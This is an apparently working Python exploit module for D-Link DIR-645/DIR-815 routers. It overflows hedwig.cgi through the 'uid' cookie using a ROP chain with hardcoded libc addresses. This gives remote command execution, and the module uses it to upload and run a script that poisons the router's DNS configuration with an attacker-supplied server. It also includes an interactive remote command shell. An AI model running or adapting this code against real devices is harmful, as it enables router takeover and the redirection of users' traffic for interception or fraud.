#coding: utf-8
'''
@Test list:
DIR 645 A1 1.01
DIR 815 1.01
'''
import string
import random
import datetime
import struct
from routelib import *
from exp_template import *
    
class dir_645_rce(Exploit):
    def __init__(self, url, taskid=0, targetid=0, cmd_connect='', data_redirect='', dns_server='', proxies={}):
        self.url = url
        self.taskid = taskid
        self.targetid = targetid
        self.cmd_connect = cmd_connect
        self.data_redirect = data_redirect
        self.dns_server = dns_server
        self.proxies = proxies
        self.log_data = []
        self.shell_data = []
        
    def meta_info(self):
        return {
            'name': 'dir_645_rce',
            'author': 'z',
            'date': '2018-03-15',
            'attack_type': 'RCE',
            'app_type': 'Router',              #路由器为Router
            'app_name': 'D-Link',
            'min_version': '',
            'max_version': '',
            'version_list': ['DIR-645'],             #min_version,max_version 和 verion_list 二者必选其一
            'description': 'Module exploits D-Link DIR-645 and DIR-600 and DIR-815 and DIR-300 buffer overflow that leads to remote code execution',
            'reference':[
                'http://securityadvisories.dlink.com/security/publication.aspx?name=SAP10008',
                'http://www.dlink.com/us/en/home-solutions/connect/routers/dir-645-wireless-n-home-router-1000',
                'http://roberto.greyhats.it/advisories/20130801-dlink-dir645.txt',
                'https://www.exploit-db.com/exploits/27283/'
            ],   #参考文档
        }
        
    def exploit(self):
        if self.check():
            self.report("Target is vulnerable")
            self.report("DNS Poisoning...")
            #self.command_stager()
            self.dns_poison(self.dns_server)

        else:
            self.report("Target is not vulnerable",Level.warming)
        self.report('Exploit is complete')

    def dns_poison(self,new_dns_server='192.168.220.5', dns_conf_path='/var/servd/DNS.conf', restart_cmd='"dnsmasq -C /var/servd/DNS.conf"'):
        every_send = 30
        completed = 0
        dns_handle = dns.dnsmasq_poison(self.dns_server)
        #dns_handle.set_debug_mode()
        dns_shell = dns_handle.get_dns_poison_shell_cmds(every_send)
        wf = dns_shell['script_name']
        total_size = dns_shell['size']
        for cmd in dns_shell['cmds']:
            completed += every_send
            self.execute(cmd)
            if completed >= total_size:
                completed = total_size
            self.report('Command Stager progress - %.2f%% done (%d/%d) bytes' % (float(completed)/total_size*100, completed, total_size))

        chmod_dns_shell = 'chmod +x %s && echo' % wf
        #execute_dns_shell = '%s %s %s %s && echo' % (wf,dns_conf_path,new_dns_server,restart_cmd)
        execute_dns_shell = '%s && echo' % (wf)

        self.report('Command: "%s" done.' % chmod_dns_shell)
        self.execute(chmod_dns_shell)
        #print execute_dns_shell
        self.report('Command: "%s" done.' % execute_dns_shell)

        result = self.execute(execute_dns_shell)

    def command_stager(self):
        while True:
            cmd = raw_input("# ")
            if cmd in ['exit', 'quit']:
                return
            self.report(self.execute(cmd))

    def execute(self, cmd):
        req = session()
        libcbase = 0x2aaf8000
        system = 0x000531FF
        calcsystem = 0x000158C8
        callsystem = 0x000159CC
        shellcode = random_text(973)
        shellcode += struct.pack("<I", libcbase + system)
        shellcode += random_text(16)
        shellcode += struct.pack("<I", libcbase + callsystem)
        shellcode += random_text(12)
        shellcode += struct.pack("<I", libcbase + calcsystem)
        shellcode += random_text(16)
        shellcode += cmd
        url = "{}/hedwig.cgi".format(self.url)
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        cookies = {'uid': shellcode}
        data = random_text(7) + "=" + random_text(7)

        response = None
        try:
            response = req.post(url=url, headers=headers, data=data, cookies=cookies)
        except requests.Timeout as err:
            pass
            self.report(err.message,Level.warming)
        except requests.ConnectionError as err:
            pass
            self.report(err.message,Level.warming)

        if response is None:
            return ""
        return response.text[response.text.find("</hedwig>") + len("</hedwig>"):].strip()

    def check(self):
        fingerprint = random_text(10)
        cmd = "echo {}".format(fingerprint)
        response = self.execute(cmd)
        if fingerprint in response:
            return True
        return False


if __name__ == "__main__":
    import sys
    if len(sys.argv) < 3:
        print 'Usage(e.g.): dir_645_rce.py http://192.168.0.1:8080 119.6.6.6'
        exit(0)
    e = dir_645_rce(sys.argv[1],dns_server=sys.argv[2])
    e.exploit()
        
        
        
